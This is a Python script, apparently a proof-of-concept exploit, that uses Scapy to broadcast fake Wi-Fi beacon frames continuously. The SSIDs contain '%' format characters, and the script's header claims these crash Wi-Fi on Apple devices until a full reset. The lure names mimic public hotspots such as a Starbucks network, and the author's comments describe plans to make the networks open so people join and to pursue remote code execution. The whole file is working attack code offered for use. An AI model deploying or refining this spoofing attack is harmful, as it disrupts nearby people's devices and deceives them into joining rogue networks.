from scapy.all import *
import os
import random
from threading import Thread

'''
this is a cocept for a bug found on apple products
might try work on remote code excution

this will just make a unch of fake accses points with % sings replaceing the spaces
even in python it would see them as code 

this bug accurs when the apple device when it connects to the wifi it see's the name as code and or veriables
and cause wifi to crash and needs to be fully reset to fix

this has been made in scapy will try to make it better and open wifi so people "join" 
and add even better and faster broadcasting of more then what is already the fastest
'''


def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="") # Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)





names = ["%Free%Wifi","%star%bucks%wifi","%custmer%first%wifi"]

mc = []

print("[-] generating mac adresses")
for m in names:
    mc.append(RandMAC())

iface = "wlan1mon"

print("[-] starting may take several secconds for them to apear")
for r in range(len(names)):
    ssid = names[r]
    mac = mc[r]
    print("[-] sending ssid ("+ssid+") with mac ("+str(mac)+")")
    Thread(target=send_beacon, args=(ssid, mac)).start()
